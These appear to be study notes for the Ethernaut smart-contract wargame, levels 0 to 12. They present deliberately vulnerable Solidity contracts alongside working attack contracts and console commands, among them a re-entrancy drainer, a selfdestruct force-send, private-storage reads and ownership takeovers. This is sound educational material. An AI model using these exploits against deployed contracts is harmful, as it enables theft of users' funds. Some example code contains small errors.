# Ethernaut Notes

### Level 0. Hello Ethernaut

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Instance {

  string public password;
  uint8 public infoNum = 42;
  string public theMethodName = 'The method name is method7123949.';
  bool private cleared = false;

  // constructor
  constructor(string memory _password) public {
    password = _password;
  }

  function info() public pure returns (string memory) {
    return 'You will find what you need in info1().';
  }

  function info1() public pure returns (string memory) {
    return 'Try info2(), but with "hello" as a parameter.';
  }

  function info2(string memory param) public pure returns (string memory) {
    if(keccak256(abi.encodePacked(param)) == keccak256(abi.encodePacked('hello'))) {
      return 'The property infoNum holds the number of the next info method to call.';
    }
    return 'Wrong parameter.';
  }

  function info42() public pure returns (string memory) {
    return 'theMethodName is the name of the next method.';
  }

  function method7123949() public pure returns (string memory) {
    return 'If you know the password, submit it to authenticate().';
  }

  function authenticate(string memory passkey) public {
    if(keccak256(abi.encodePacked(passkey)) == keccak256(abi.encodePacked(password))) {
      cleared = true;
    }
  }

  function getCleared() public view returns (bool) {
    return cleared;
  }
}
```

### Level 1. [Fallback](https://hackernoon.com/ethernaut-lvl-1-walkthrough-how-to-abuse-the-fallback-function-118057b68b56)

**Goal**: This levels requires you to exploit a poorly implemented fallback function to gain control of someone else’s smart contract.

**_What is a Fallback function_**

It is best practice to implement a **simple** Fallback function if you want your smart contract to **_generally_** **receive Ether from other contracts and wallets**.

> The Fallback function enables a smart contract’s inherent ability to act like a wallet.

If I have your wallet address, I can send you Ethers without your permission. In most cases, you might want to enable this ease-of-payment feature for your smart contracts too. This way, other contracts/wallets can send Ether to your contract, without having to know your ABI or specific function names.

> Note: without a fallback, or known payable functions, smart contracts can only receive Ether: i) as a mining bonus, or ii) as the backup wallet of another contract that has **self-destructed**.

The problem is when developers implement key logic _inside the fallback function_.

Such bad practices include: changing contract ownership, transferring the funds, etc. inside the fallback function:

```solidity
receive() external payable {
  require(msg.value > 0 && contributions[msg.sender] > 0);
  owner = msg.sender;
}
```

For more about fallback and receive function read [this](https://betterprogramming.pub/solidity-0-6-x-features-fallback-and-receive-functions-69895e3ffe).

> This is why the fallback function in version 0.6x was split into two separate functions:
>
> - receive() external payable — For empty call data (and any value)
> - fallback() external payable — When no other function matches (not even the receive function). Optionally payable.
>
> This separation provides an alternative to the fallback function for contracts that want to receive plain Ether.

Bad practice: you should not reassign contract ownership in a fallback function

This level demonstrates how you open up your contract to abuse, because **anyone can trigger a fallback function**.

**_Ways to trigger the Fallback function_**

Anyone can call a fallback function by:

1. Calling a **function that doesn’t exist** inside the contract, or
2. Calling a function **without passing in required data**, or
3. Sending **Ether without any data** to the contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallback {

  using SafeMath for uint256;
  mapping(address => uint) public contributions;
  address payable public owner;

  constructor() public {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    // call this function like:
    // contract.contribute({value: toWei('0.0001', 'ether')})
    // or contract.contribute({value: toWei('0.0001')})
    // notice that the value should be less than 0.001 ether
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}

```

**_Key Security Takeaways_**

- If you implement a fallback function, **keep it simple**
- Use fallback functions to **emit payment events to the transaction log**
- Use fallback functions to **check simple conditional requirements**
- **Think twice** before using fallback functions to change contract ownership, transfer funds, support low-level function calls, and more.

### Level 2. [Fallout](https://0xsage.medium.com/ethernaut-lvl-2-walkthrough-how-simple-developer-errors-become-big-mistakes-b705ff00a62f)

**Goal**: Gain control of someone else’s smart contract.

Notice Fallout() is misspelled as Fal1out(), causing the constructor function to become a public function that you can call anytime.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallout {

  using SafeMath for uint256;
  mapping (address => uint) allocations;
  address payable public owner;


  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  modifier onlyOwner {
	        require(
	            msg.sender == owner,
	            "caller is not the owner"
	        );
	        _;
	    }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }

  function sendAllocation(address payable allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(address(this).balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
```

### Level 3. [Coin Flip](https://dev.to/nvn/ethernaut-hacks-level-3-coin-flip-3o83)

**Goal**: This levels requires you to correctly guess the outcome of a coin flip, **ten times in a row.**

**_How Ethereum generate "randomness"_**

> There’s no true randomness on Ethereum blockchain, only random generators that are considered “good enough”.

Developers currently create psuedo-randomness in Ethereum by hashing variables that are **unique**, or **difficult to tamper with**. Examples of such variables include `transaction timestamp`, `sender address`, `block height, etc`.

Ethereum then offers two main cryptographic hashing functions, namely, SHA-3 and the newer KECCAK256, which hash the concatenation string of these input variables.

This generated hash is finally converted into a large integer, and then mod’ed by n. This is to get a discrete set of probability integers, inside the desired range of 0 to n.

> Notice that in our Ethernaut exercise, n=2 to represent the two sides of a coin flip.
> Example of input variables that are often cryptographically hashed
> ![](https://miro.medium.com/max/1400/1*c7aNl-L0RjDq4EWdDOfaGw.png)

**This method of deriving pseudo-randomness in smart contracts makes them vulnerable to attack. Adversaries who know the input, can thus guess the “random” outcome.**

This is the key to solving your CoinFlip level. Here, the input variables that determine the coin flip are publicly available to you.

Given Contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

Solution:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface ICoinFlip {
  function flip(bool _guess) external returns (bool);
}

contract HackFlip {
  uint256 public consecutiveWins = 0;
  uint256 lastHash;
  uint256 public FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function coinFlipGuess(address _coinFlipAddr) external returns (uint256) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    bool isRight = ICoinFlip(_coinFlipAddr).flip(side);
    if (isRight) {
        consecutiveWins++;
    } else {
        consecutiveWins = 0;
    }

    return consecutiveWins;
  }
}
```

Now, simply call `coinFlipGuess` method (on Remix) with `<your-instance-address>` as only parameter, 10 times with successful transaction.

Go back to console and query `consecutiveWins` from `CoinFlip` instance:

```js
await contract.consecutiveWins().then((v) => v.toString());
// Output: '10'
```

Useful links:

- [Deploy contract on Rinkeby using Remix and MetaMask](https://ethereum.stackexchange.com/questions/110094/can-i-connect-to-rinkeby-using-remix-and-metamask)
- Solidity - interacting with a deployed contract at an address. Read [this](https://solidity-by-example.org/interface/) or better watch [this](https://www.youtube.com/watch?v=YWtT0MNHYhQ)

### Level 4. Telephone

**Goal**: Gain control of someone else’s smart contract.

[Difference between tx.origin and msg.sender](https://ethereum.stackexchange.com/questions/1891/whats-the-difference-between-msg-sender-and-tx-origin)

While this example may be simple, confusing tx.origin with msg.sender can lead to phishing-style attacks, such as [this](https://blog.ethereum.org/2016/06/24/security-alert-smart-contract-wallets-created-in-frontier-are-vulnerable-to-phishing-attacks/) and [this](https://hackernoon.com/hacking-solidity-contracts-using-txorigin-for-authorization-are-vulnerable-to-phishing).

An example of a possible attack is outlined below.

1. Use tx.origin to determine whose tokens to transfer, e.g.
   `function transfer(address _to, uint _value) { tokens[tx.origin] -= _value; tokens[_to] += _value; }`

2. Attacker gets victim to send funds to a malicious contract that calls the transfer function of the token contract, e.g.
   `function () payable { token.transfer(attackerAddress, 10000); }`

3. In this scenario, tx.origin will be the victim's address (while msg.sender will be the malicious contract's address), resulting in the funds being transferred from the victim to the attacker.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

`player` will call `HackTelephone` contract's `telephone`, which in turn will call `Telephone`'s `changeOwner` with `msg.sender` (which is `player`) as param. In that case `tx.origin` is `player` and `msg.sender` is `HackTelephone`'s address. And since now `tx.origin != msg.sender`, `player` has claimed the ownership.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract HackTelephone {
    function telephone(address _telephoneAddr) external {
        ITelephone(_telephoneAddr).changeOwner(0xc85cD8feb12dBFBCA493C8F80b2F93161D0df642);
    }
}
```

### Level 5. [Token](https://dev.to/nvn/ethernaut-hacks-level-5-token-2j4o)

**Goal**: `player` is initially assigned 20 tokens i.e. `balances[player] = 20` and has to somehow get any additional tokens (so that `balances[player] > 20` ).

Integer [overflow/underflow](https://docs.soliditylang.org/en/v0.6.0/security-considerations.html#two-s-complement-underflows-overflows) in Solidity 0.6.0

Overflows are very common in solidity and must be checked for with control statements such as:
`if(a + c > a) { a = a + c; }`
An easier alternative is to use OpenZeppelin's SafeMath library that automatically checks for overflows in all the mathematical operators. The resulting code looks like this:
`a = a.add(c);`
If there is an overflow, the code will revert.

The `transfer` method of `Token` performs some unchecked arithmetic operations on `uint256` (`uint` is shorthand for `uint256` in Solidity) integers. That is prone to underflow.

The max value of a 256 bit unsigned integer can represent is 2^256 − 1, which is -
`115,792,089,237,316,195,423,570,985,008,687,907,853,269,984,665,640,564,039,457,584,007,913,129,639,935`

Hence `uint256` can only comprise values from `0` to `2^256 - 1` only. Any addition/subtraction would cause overflow/underflow. For example:

```
Let M = 2^256 - 1 (max value of uint256)

0 - 1 = M

M + 1 = 0

20 - 21 = M

(All numbers are 256-bit unsigned integers)
```

We're going to use last expression from example above to exploit the contract.

Let's call `transfer` with a zero address (or any address other than `player`) as `_to` and 21 as `_value` to transfer.

```js
// balances[msg.sender] = 20 - 21 = 2^256 - 1
await contract.transfer("0x0000000000000000000000000000000000000000", 21);
```

A nice thing to note is that it worked because contract's compiler version is `v0.6.0`. This, most probably, **won't work for latest version** because underflow/overflow causes failing assertion by default in latest version.

Given Contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```

My Solution (w/o using overflow):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface IToken {
    function transfer(address _to, uint _value) external returns (bool);
}

contract HackToken {
    function hackToken(address _tokenAddr) external {
        // transfer to my address 21000000 tokens from this contract address:
        IToken(_tokenAddr).transfer(0xc85cD8feb12dBFBCA493C8F80b2F93161D0df642, 21000000);
    }
}
```

Useful links:
[Who is msg.sender when calling a contract from a contract](https://ethereum.stackexchange.com/questions/28972/who-is-msg-sender-when-calling-a-contract-from-a-contract)

### Level 6. Delegation

**Goal**: Gain control of someone else’s smart contract.

Usage of `delegatecall` is particularly risky and has been used as an attack vector on multiple historic hacks. With it, your contract is practically saying "here, -other contract- or -other library-, do whatever you want with my state". Delegates have complete access to your contract's state. The `delegatecall` function is a powerful feature, but a dangerous one, and must be used with extreme care.

Please refer to the [The Parity Wallet Hack Explained](https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7/) article for an accurate explanation of how this idea was used to steal 30M USD.

![](https://miro.medium.com/max/1400/1*907YyYjEuAZCeLT9XiOA7A.png)

Given Contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```

A simple one if you clearly understand how `delegatecall` works, which is being used in `fallback` method of `Delegation`.

We just have to send function signature of `pwn` method of `Delegate` as `msg.data` to `fallback` so that _code_ of `Delegate` is executed in the context of `Delegation`. That changes the ownership of `Delegation`.

So, first get encoded function signature of `pwn`, in console:

```js
signature = web3.eth.abi.encodeFunctionSignature("pwn()");
```

Then we send a transaction with `signature` as data, so that `fallback` gets called:

```js
await contract.sendTransaction({ from: player, data: signature });
```

### Level 7. [Force](https://dev.to/nvn/ethernaut-hacks-level-7-force-4g2o) (\*\*\*)

In solidity, for a contract to be able to receive ether, the fallback function must be marked **payable**.

However, there is no way to stop an attacker from sending ether to a contract by self destroying. Hence, it is important not to count on the invariant `address(this).balance == 0` for any contract logic.

`player` has to somehow make this empty contract's balance grater that 0.

Given Contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

Simple `transfer` or `send` won't work because the `Force` implements neither `receive` nor `fallaback` functions. Calls with any value will revert.

However, the checks can be bypassed by using `selfdestruct` of an intermediate contract - `Payer` which would specify `Force`'s address as beneficiary of it's funds after it's self-destruction.

Solution:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract HackForce {
    uint public balance = 0;

    function destruct(address payable _to) external payable {
        selfdestruct(_to);
    }

    function deposit() external payable {
        balance += msg.value;
    }
}
```

Send a value of say, `10000000000000 Wei` (0.00001 eth) by calling `deposit`, so that `Payer`'s balance increases to same amount.

Call `destruct` of Payer with `<instance-address> ` as parameter. That's destroy `Payer` and send all of it's funds to `Force`.

### Level 8. Vault

**Goal**: `player` has to set locked to false.

It's important to remember that marking a variable as private **_only prevents other contracts from accessing it_**. State variables marked as private and local variables are still publicly accessible.

To ensure that data is private, it needs to be encrypted before being put onto the blockchain. In this scenario, the decryption key should never be sent on-chain, as it will then be visible to anyone who looks for it. [zk-SNARKs](https://blog.ethereum.org/2016/12/05/zksnarks-in-a-nutshell/) (RSA (Rivest–Shamir–Adleman, a public-key cryptosystem) and Zero-Knowledge Proofs) provide a way to determine whether someone possesses a secret parameter, without ever having to reveal the parameter.

Given contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) public {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```

Only way is by calling `unlock` by correct password.

Although `password` state variable is private, one can still read a storage variable by determining it's storage slot. Therefore sensitive information should not be stored on-chain, even if it is specified `private`.

Above, the `password` is at a storage slot of 1 in `Vault`.

Read the password:

```js
// e is null/event here
await web3.eth.getStorageAt(instance, 1, (e, v) => console.log(v));
// or
await web3.eth.getStorageAt(instance, 1, (e, v) =>
  console.log(web3.utils.toAscii(v))
);
// or
password = await web3.eth.getStorageAt(contract.address, 1);
```

Useful links:

- [How do I see the value of a string stored in a private variable?](https://ethereum.stackexchange.com/questions/44893/how-do-i-see-the-value-of-a-string-stored-in-a-private-variable)
- [Solidity - Variables](https://www.tutorialspoint.com/solidity/solidity_variables.htm)
  - **State Variables** − Variables whose values are permanently stored in a contract storage.
  - **Local Variables** − Variables whose values are present till function is executing.
  - **Global Variables** − Special variables exists in the global namespace used to get information about the blockchain.

### Level 9. King

The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD

**Goal**: `player` has to prevent the current level from reclaiming the kingship after instance is submitted.

Given contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value); // <===
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}
```

Kingship is switched in `receive` function i.e. when a specific value is sent to `King`. So, we'll have to somehow prevent execution of `receive`.

The key thing to notice is that previous `king` is sent back `msg.value` using `transfer`. But what if this previous `king` was a contract and it didn't implement any `receive` or `fallback`? It won't be able to receive any value. `transfer` stops execution with an exception (unlike `send`).

Solution: (a contract `HackKing` that has NO `receive` or `fallback`)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract HackKing {
    function claimKingship(address payable _to) public payable {
        (bool sent, ) = _to.call{value: msg.value}("");
        require(sent, "Failed to send value");
    }
}
```

Call `claimKingship` of `HackKing` with param `<instance-address>` and set the amount `1000000000000000 Wei` as value in Remix. That will make `HackKing` contract as king.

Submit the instance. Upon submitting the level will try to reclaim kingship through `receive` fallback. However, it will fail.

This is because upon reaching line:

```
king.transfer(msg.value);
```

exception would occur because `king` (i.e. deployed `HackKing` contract) has no fallback functions.

Bonus thing to note here is that in `HackKing`'s `claimKingship`, call is used specifically. `transfer` or `send` will fail because of limited 2300 gas stipend. `receive` of `King` would require more than 2300 gas to execute successfully.

Most of Ethernaut's levels try to expose (in an oversimplified form of course) something that actually happened — a real hack or a real bug.

In this case, see: [King of the Ether](https://www.kingoftheether.com/thrones/kingoftheether/index.html) and [King of the Ether Postmortem](http://www.kingoftheether.com/postmortem.html).

Useful links:

- Solidity contract [receive](https://ethereum.stackexchange.com/questions/81994/what-is-the-receive-keyword-in-solidity/81995) function
- [transfer](https://docs.soliditylang.org/en/v0.8.10/types.html#members-of-addresses) method of addresses
- (\*) Difference between send and transfer, read [this](https://ethereum.stackexchange.com/questions/79924/what-is-the-core-difference-between-send-and-transfer-method-of-address-payable) and [this](https://ethereum.stackexchange.com/questions/19341/address-send-vs-address-transfer-best-practice-usage)
- [The 2300 gas stipend](https://hackmd.io/@vbuterin/evm_feature_removing)

### Level 10. Re-entrancy

**Goal**: `player` has to steal all of the contract's funds.

Things that might help:

- Untrusted contracts can execute code where you least expect it.
- Fallback methods
- Throw/revert bubbling
- Sometimes the best way to attack a contract is with another contract.

Given contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Reentrance {

  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) { // <==
      (bool result,) = msg.sender.call{value:_amount}(""); // <==
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount; // <==
    }
  }

  receive() external payable {}
}
```

We're going to attack `Reentrance` with our written contract `ReentrancyAttack`. Deploy it with target contract (`Reentrance`) address:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract ReentrancyAttack {
    address public owner;
    IReentrance targetContract;
    uint targetValue = 1000100000000000;

    constructor(address _targetAddr) {
        targetContract = IReentrance(_targetAddr);
        owner = msg.sender;
    }

    function balance() public view returns (uint) {
        return address(this).balance;
    }

    function donateAndWithdraw() public payable {
        require(msg.value >= targetValue);
        targetContract.donate{value: msg.value}(address(this));
        targetContract.withdraw(msg.value);
    }

    function withdrawAll() public returns (bool) {
        require(msg.sender == owner, "it's my money!");
        uint totalBalance = address(this).balance;
        (bool sent, ) = msg.sender.call{value: totalBalance}("");
        // require(sent, "Failed to send Ether");
        return sent;
    }

    receive() external payable { // <== [1]
        uint targetBalance = address(targetContract).balance;
        if (targetBalance >= targetValue) targetContract.withdraw(targetValue);
    }
}
```

Now call `donateAndWithdraw` of `ReentrancyAttack` with value of `1000000000000000 wei` (`0.001 ether`) and chain reaction starts:

- First `targetContract.donate.value(msg.value)(address(this))` causes the `balances[msg.sender]` of `Reentrance` to set to sent amount. `donate` of `Reentrance` finishes it's execution
- Immediately after, `targetContract.withdraw(msg.value)` invokes `withdraw` of `Reentrance`, which sends the same donated amount back to `ReentrancyAttack`.
- `receive` of `ReentrancyAttack` is invoked. Note that `withdraw` hasn't finished execution yet! So still `balances[msg.sender]` is equal to initially donated amount. Now we call `withdraw` of `ReentrancyAttack` again in `receive`.
- Second invocation of `withdraw` executes and it's passes the require statement this time again! So, it sends the `msg.sender` (`ReentrancyAttack` address) that amount again!
- Simple arithmetic plays out and recursive execution is halted only when balance of `Reentrance` is reduced to 0. **[1]**

![](https://miro.medium.com/max/1400/1*HGRY9Lbox56-o9nbCgBepg.jpeg)

**_The DAO Hack_**

The famous DAO hack used reentrancy to extract a huge amount of ether from the victim contract. See [15 lines of code that could have prevented TheDAO Hack](https://blog.openzeppelin.com/15-lines-of-code-that-could-have-prevented-thedao-hack-782499e00942/).

- Check out the full [analysis of the DAO hack](https://hackingdistributed.com/2016/06/18/analysis-of-the-dao-exploit/) here.
- To those interested, the Re-entrancy attack was responsible for the [infamous DAO hack of 2016](https://www.gemini.com/cryptopedia/the-dao-hack-makerdao#section-what-is-a-dao) which shook the whole Ethereum community. $60 million dollars of funds were stolen. Later, Ethereum blockchain was hard forked to restore stolen funds, but not all parties consented to decision. That led to splitting of network into distinct chains - Ethereum and Ethereum Classic.

**_Key Security Takeaways_**

- The order of execution really matters in Solidity. If you must make external function calls, make the last thing you do (after all requisite checks and balances):
  ```solidity
  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
        balances[msg.sender] -= _amount;
        if(msg.sender.transfer(_amount)()) {
            _amount;
        }
    }
  }
  // Or even better, invoke transfer in a separate function
  ```
- Include a **mutex** to prevent re-entrancy, e.g. use a boolean **lock** variable to signal execution depth.
- Be careful when using **function modifiers** to check invariants: modifiers are executed at the start of the function. If the variable state will change during the entirety of the function, consider extracting the modifier into a check placed at the correct line in the function.
- ❌ “Use `transfer` to move funds out of your contract, since it `throw`s and limits gas forwarded. Low level functions like `call` and `send` just return false but don't interrupt the execution flow when the receiving contract fails.” — from Ethernaut level
  - `transfer` and `send` are no longer recommended solutions as they can potentially break contracts after the Istanbul hard fork. [Source 1](https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/) [Source 2](https://forum.openzeppelin.com/t/reentrancy-after-istanbul/1742)
- Always assume that the receiver of the funds you are sending can be another contract, not just a regular address. Hence, it can execute code in its payable fallback method and _re-enter_ your contract, possibly messing up your state/logic.
- Re-entrancy is a common attack. You should always be prepared for it!

### Level 11. Elevator

**Goal**: `player` has to set top to true i.e. have to reach top of the building.

Given contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

Solution: ([Solidity inheritance](https://www.geeksforgeeks.org/solidity-inheritance/))

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface Building {
    function isLastFloor(uint) external returns (bool);
}

interface IElevator {
    function goTo(uint _floor) external;
}

contract MyBuilding is Building {

    bool public isLast = true;

    function isLastFloor(uint _n) override external returns (bool) {
        isLast = !isLast;
        return isLast;
    }

    function callGoTo(address _elevatorAddr) public {
        IElevator(_elevatorAddr).goTo(1);
    }
}
```

or

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface IElevator {
    function goTo(uint _floor) external;
}

contract Building {
    IElevator public el = IElevator(0xB5A83695305eCaF30Beed5DbC5B4fbA9C307608c);
    bool public switchFlipped = false;

    function hack() public {
        el.goTo(1);
    }

    function isLastFloor(uint) public returns (bool) {
        if (!switchFlipped) { // first call
            switchFlipped = true;
            return false;
        } else { // second call
          switchFlipped = false;
          return true;
        }
    }
}
```

Although we did implement `isLastFloor`, we won't use `_floor` param anywhere to determine if it's last floor. We are not obliged to anyway.

We just alternate between returning `true` and `false`, so that 1st call will return `false` and 2nd call returns `true` and so on.

Simply call `callGoTo` of `MyBuilding`, with contract.address of instance. That'll trigger `Elevator` to call `isLastFloor` of our contract - `MyBuilding`. And since second call sets `top` variable, it is set to `true`.

**_Key Security Takeaways_**

- You can use the `view` function modifier on an interface in order to prevent state modifications. The `pure` modifier also prevents functions from modifying the state. Make sure you read [Solidity's documentation and learn its caveats](http://solidity.readthedocs.io/en/develop/contracts.html#view-functions).
- An alternative way to solve this level is to build a view function which returns different results depends on input data but don't modify state, e.g. `gasleft()`.

Useful links:

- Solidity [interfaces](https://docs.soliditylang.org/en/v0.8.10/contracts.html#interfaces)

### Level 12. Privacy (\*\*\*\*)

**Goal**: `player` has to set `locked` state variable to `false`.

Refer to [Level 8](#level-8-vault) about layout of state variables in a Solidity contract and reading storage at a slot.

To solve this level, let’s dive deeper into how Ethereum optimises data storage. But first, make sure you know how to read storage on the blockchain.

![](https://miro.medium.com/max/1400/1*wY8Si-mt_QZWqg0jnEDw8A.jpeg)
![](https://miro.medium.com/max/1400/1*g3odw8DHxmw0YPrhqDf3oA.jpeg)
![](https://miro.medium.com/max/1400/1*Zl3EkleTiPQEssEsu44MuA.jpeg)

**Exceptions**:

1. **`constants`** are not stored in storage. From Ethereum [documentation](https://docs.soliditylang.org/en/latest/contracts.html#constants), that the compiler does not reserve a storage slot for `constant` variables. This means you won’t find the following in any storage slots:

```solidity
contract A {
    uint public constant number = ...; //not stored in storage
}
```

2. **`Mappings`** and **`dynamically-sized arrays`** do not stick to these conventions. More on this at a later level.

Given Contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Privacy {

  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(now);
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) public {
    data = _data;
  }

  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}
```

`unlock` uses the third entry (index 2) of `data` which is a `bytes32` array. Let's determined `data`'s third entry's slot number (each slot can accommodate at most 32 bytes) according to storage rules:

- `locked` is 1 byte `bool` in slot 0.
- `ID` is a 32 byte `uint256`. It is 1 byte extra big to be inserted in slot 0. So it goes in & totally fills slot 1.
- `flattening` - a 1 byte `uint8`, `denomination` - a 1 byte `uint8` and `awkwardness` - a 2 byte `uint16` totals 4 bytes. So, all three of these go into slot 2.
- Array data always start a new slot, so `data` starts from slot 3. Since it is `bytes32` array each value takes 32 bytes. Hence value at index 0 is stored in slot 3, index 1 is stored in slot 4 and index 2 value goes into slot 5.

Alright so key is in slot 5 (index 2 / third entry). Read it.

```js
key = await web3.eth.getStorageAt(contract.address, 5);
```

This `key` is 32 byte. But `require` check in `unlock` converts the `data[2]` 32 byte value to a `byte16` before matching.

`byte16(data[2])` will truncate the last 16 bytes of `data[2]` and return only the first 16 bytes.

Accordingly convert `key` to a 16 byte hex (with prefix - `0x`):

```js
key = key.slice(0, 34); // <== 34 = 2 * 16 + 2 since 1 byte = 8 bits = 2 hex digits
```

Nothing in the ethereum blockchain is private. The keyword private is merely an artificial construct of the Solidity language. Web3's `getStorageAt(...)` can be used to read anything from storage. It can be tricky to read what you want though, since several optimization rules and techniques are used to compact the storage as much as possible.

It can't get much more complicated than what was exposed in this level. For more, check out this excellent article by "Darius": [How to read Ethereum contract storage](https://medium.com/@dariusdev/how-to-read-ethereum-contract-storage-44252c8af925)

**_Key Security Takeaways_**

- In general, excessive slot usage wastes gas, especially if you declared structs that will reproduce many instances. **Remember to optimize your storage to save gas!**
